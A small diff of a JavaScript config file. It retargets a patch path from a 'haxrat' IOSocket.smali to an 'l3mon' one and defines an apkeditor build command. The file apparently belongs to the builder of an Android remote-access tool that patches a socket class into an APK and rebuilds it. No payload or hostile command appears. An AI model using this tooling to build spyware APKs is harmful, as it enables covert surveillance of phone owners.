@@ -19,7 +19,7 @@ exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.
 // apktool.jar removed, only apkeditor used for building
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 // Fixed patch path: smali/classes/com/...
-exports.patchFilePath = path.join(exports.smaliPath, 'smali/classes/com/hax4us/haxrat/IOSocket.smali');
+exports.patchFilePath = path.join(exports.smaliPath, 'smali/classes/com/etechd/l3mon/IOSocket.smali');
 
 // Build command using apkeditor (no apktool)
 exports.buildCommand = `apkeditor b -i "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
